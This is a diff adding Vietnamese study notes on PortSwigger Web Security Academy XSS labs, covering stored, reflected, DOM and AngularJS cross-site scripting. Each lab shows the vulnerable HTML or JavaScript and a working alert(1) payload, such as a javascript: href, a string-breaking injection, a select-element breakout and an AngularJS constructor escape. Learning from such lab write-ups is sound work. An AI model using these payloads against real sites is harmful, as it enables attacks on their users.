@@ -222,5 +222,224 @@ $('section.blog-list h2:contains(<img src=x onerror=alert(1)>)')
 ```
 - Khi `hover` vào `input`, `alert(1)` sẽ xuất hiện
 
+### Stored XSS into anchor href attribute with double quotes HTML-encoded
+- Mục tiêu: Thực hiện một cuộc tấn công XSS để gọi hàm `alert`.
+- Loại lỗ hổng: Stored XSS
+- Vị trí: Chức năng `Comment` - Phần `Website`
+
+#### Comment inspect
+
+```html
+<section class="comment">
+    <p>
+        <img src="/resources/images/avatarDefault.svg" class="avatar">                            
+        <a id="author" href="http://a.com">a</a> | 26 May 2025
+    </p>
+    <p>a</p>
+    <p></p>
+</section>
+```
+
+#### Exploit
+Payload:
+```
+javascript:alert(1)
+```
+- Thêm paylaod này vào phần `Website`
+- Submit
+- Thẻ `<a>` được thay đổi thành
+
+```html
+<a id="author" href="http://a.com">a</a> | 26 May 2025
+```
+- Khi click vào `a`, XSS xuất hiện.
+
+
+### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+- Mục tiêu: Thực hiện một tấn công XSS phản xạ `(reflected XSS)` để gọi hàm `alert()` bằng cách thoát khỏi chuỗi `JavaScript` nơi dữ liệu được phản xạ, mặc dù các dấu " đã bị mã hóa.
+- Loại lỗ hổng: Reflected XSS
+- Vị trí: Chức năng `search`
+
+#### Search inspect
+```html
+<script>
+    var searchTerms = 'abc';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+<img src="/resources/images/tracker.gif?searchTerms=abc" c54oj1cyc="">
+```
+
+#### Exploit
+- Search với payload
+```
+; alert(1);//
+```
+- Source code sẽ thay đổi thành
+```html
+<script>
+    var searchTerms = ''; alert(1);//';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+<img src="/resources/images/tracker.gif?searchTerms=" cv1nsp83o="">
+```
+- Tách lệnh bằng `;` sau đó hiện thị `alert(1)` và `comment` bằng `//`
+
+```html
+<script>
+    var searchTerms = ''; alert(1);//';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+<img src="/resources/images/tracker.gif?searchTerms=" cv1nsp83o="">
+```
+
+- Dùng cách ngắn hơn `'-alert(1)-'` hay `'+alert(1)+'`
+
+### Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element
+- Mục tiêu: Thực hiện một tấn công XSS để gọi hàm `alert()`
+- Loại lỗ hổng: DOM base XSS
+- Vị trí: Chức năng `stock checker`
+
+#### Code inspect
+```html
+<form id="stockCheckForm" action="/product/stock" method="POST">
+    <input required="" type="hidden" name="productId" value="1">
+    <script>
+        var stores = ["London","Paris","Milan"];
+        var store = (new URLSearchParams(window.location.search)).get('storeId');
+        document.write('<select name="storeId">');
+        if(store) {
+            document.write('<option selected>'+store+'</option>');
+        }
+        for(var i=0;i<stores.length;i++) {
+            if(stores[i] === store) {
+                continue;
+            }
+            document.write('<option>'+stores[i]+'</option>');
+        }
+        document.write('</select>');
+    </script>
+    <select name="storeId">
+        <option>London</option>
+        <option>Paris</option>
+        <option>Milan</option>
+    </select>
+    <button type="submit" class="button">Check stock</button>
+</form>
+```
+
+Có thể khai thác từ đây
+```html
+<script>
+    var store = (new URLSearchParams(window.location.search)).get('storeId');
+    document.write('<select name="storeId">');
+    if(store) {
+        document.write('<option selected>'+store+'</option>');
+    }
+</script>
+```
+
+- Ứng dụng lấy `storeId` từ `url`
+- Ghi `storeId` ra `page` nếu có
+
+#### Exploit
+- Mặc định chưa có tham số `storeId` trên url
+- Cần thêm `storeId` dưới dạng `payload`
+```
+https://0a8e00370342ad4c80f112380058001f.web-security-academy.net/product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
+```
+
+- Request
+```http
+GET /product?productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E HTTP/1.1
+Host: 0a8e00370342ad4c80f112380058001f.web-security-academy.net
+```
+
+- Script trở thành
+
+```html
+<form id="stockCheckForm" action="/product/stock" method="POST">
+    ...
+    <select name="storeId">
+        <option selected="">"&gt;</option>
+    </select>
+    <img src="1" onerror="alert(1)">
+    <option>London</option>
+    <option>Paris</option>
+    <option>Milan</option>
+    <button type="submit" class="button">Check stock</button>
+</form>
+```
+
+### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+- Mục tiêu: Tấn công XSS thực thi biểu thức `AngularJS` và gọi hàm `alert()`
+- Lỗ hổng: DOM base XSS trong một biểu thức `AngularJS`
+- Vị trí: Trong chức năng tìm kiếm
+
+```html
+<h1>0 search results for '123'</h1>
+```
+
+- Xem nguồn trang và quan sát rằng chuỗi ngẫu nhiên của bạn được đặt trong một chỉ thị `ng-app`
+{% raw %}
+- Nhập biểu thức AngularJS sau trong hộp tìm kiếm: `{{$on.constructor('alert(1)')()}}`
+- `{{ ... }}` là `AngularJS expression binding`.
+{% endraw %}
+- `$on` là một phương thức mặc định trong scope của một `controller/component` trong `AngularJS` — nó dùng để đăng ký event listeners.
+- `$on.constructor` → trả về Function constructor, vì $on là một function.
+- `'alert(1)'` → được truyền vào Function constructor → tạo ra function thực thi alert(1).
+- `()` gọi function đó → thực thi XSS (alert(1)).
+
+### Lab: Reflected DOM XSS
+- Mục tiêu: Tạo một `inject` gọi hàm `alert()`
+
+### Response from server
+
+#### /resources/js/searchResults.js
+```http
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+Cache-Control: public, max-age=3600
+X-Frame-Options: SAMEORIGIN
+Content-Length: 2728
+
+function search(path) {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            eval('var searchResultsObj = ' + this.responseText);
+            displaySearchResults(searchResultsObj);
+        }
+    };
+    xhr.open("GET", path + window.location.search);
+    xhr.send();
+    ...
+}
+```
+- Trong `response` trên có hàm nguy hiển `eval()`
+- `eval()` nguy hiểm vì nó cho phép thực thi bất kỳ mã JavaScript nào được truyền vào dưới dạng chuỗi, ví dụ:
+
+```js
+eval("alert('Hacked!')");
+```
+
+#### Response for /search-results?search=\"-alert(1)}//
+```http
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 45
+
+{"results":[],"searchTerm":"\\"-alert(1)}//"}
+```
+- `this.responseText` lúc này là chuỗi `'{"results":[],"searchTerm":"\\"-alert(1)}//"}'`
+- khi `eval()` chạy chuỗi JSON này, nó dịch chuỗi escape \" thành ", và sẽ hiểu đoạn mã là:
+
+```js
+var searchResultsObj = {
+  results: [],
+  searchTerm: ""-alert(1)}//"
+};
+```
+
 ---
 Goodluck! 🍀🍀🍀
